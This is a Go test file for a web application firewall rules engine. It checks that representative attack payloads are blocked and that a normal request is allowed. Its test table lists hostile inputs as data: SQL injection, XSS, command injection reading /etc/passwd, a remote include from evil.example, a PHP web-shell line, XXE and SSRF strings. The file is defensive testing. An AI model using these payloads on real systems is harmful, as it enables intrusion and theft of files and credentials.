package rules

import "testing"

func TestDefaultRulesBlockRepresentativePayloads(t *testing.T) {
	engine, err := New(nil, nil, 4, 2)
	if err != nil {
		t.Fatal(err)
	}
	tests := []struct {
		name   string
		input  map[string]string
		expect string
	}{
		{"sqli", map[string]string{"query": "id=1' OR '1'='1"}, "942-002"},
		{"xss", map[string]string{"query": "q=<script>alert(1)</script>"}, "941-001"},
		{"rce", map[string]string{"query": "cmd=;cat /etc/passwd"}, "932-001"},
		{"lfi", map[string]string{"query": "file=/etc/passwd"}, "930-001"},
		{"rfi", map[string]string{"query": "file=http://evil.example/shell.php"}, "931-001"},
		{"ssti", map[string]string{"query": "q={{7*7}}"}, "932-002"},
		{"php", map[string]string{"body": "<?php system($_GET['x']); ?>"}, "933-001"},
		{"node", map[string]string{"body": `{"__proto__":{"polluted":true}}`}, "934-001"},
		{"java", map[string]string{"body": "java.lang.Runtime.getRuntime()"}, "934-002"},
		{"xss-dom", map[string]string{"query": "q=document.cookie"}, "941-002"},
		{"sqli-time", map[string]string{"query": "x=SLEEP(5)"}, "942-003"},
		{"xxe", map[string]string{"body": `<!ENTITY xxe SYSTEM "file:///etc/passwd">`}, "944-001"},
		{"ldap", map[string]string{"query": "filter=ldap://example"}, "944-002"},
		{"nosql", map[string]string{"body": `{"$where":"function(){return true}"}`}, "944-003"},
		{"ssrf", map[string]string{"query": "url=http://127.0.0.1/admin"}, "944-004"},
		{"scanner", map[string]string{"user_agent": "sqlmap/1.8"}, "949-001"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			d := engine.Inspect(tc.input)
			if d == nil {
				t.Fatalf("expected block for %s", tc.name)
			}
			found := false
			for _, id := range d.MatchedRules {
				if id == tc.expect {
					found = true
					break
				}
			}
			if !found && d.RuleID != tc.expect {
				t.Fatalf("expected rule %s, primary=%s matched=%v", tc.expect, d.RuleID, d.MatchedRules)
			}
		})
	}
}

func TestDefaultRulesAllowNormalRequest(t *testing.T) {
	engine, err := New(nil, nil, 4, 2)
	if err != nil {
		t.Fatal(err)
	}
	if d := engine.Inspect(map[string]string{
		"path":       "/products/42",
		"query":      "q=shoes&page=2",
		"headers":    "accept: text/html",
		"user_agent": "Mozilla/5.0",
		"body":       "name=shoes",
	}); d != nil {
		t.Fatalf("normal request unexpectedly blocked by %s", d.RuleID)
	}
}

func TestMediumRuleContributesAtLowerThreshold(t *testing.T) {
	engine, err := New(nil, nil, 3, 2)
	if err != nil {
		t.Fatal(err)
	}
	d := engine.Inspect(map[string]string{"query": "jsessionid=ABCDEF"})
	if d == nil || d.RuleID != "943-001" {
		t.Fatalf("expected session fixation rule, got %#v", d)
	}
}
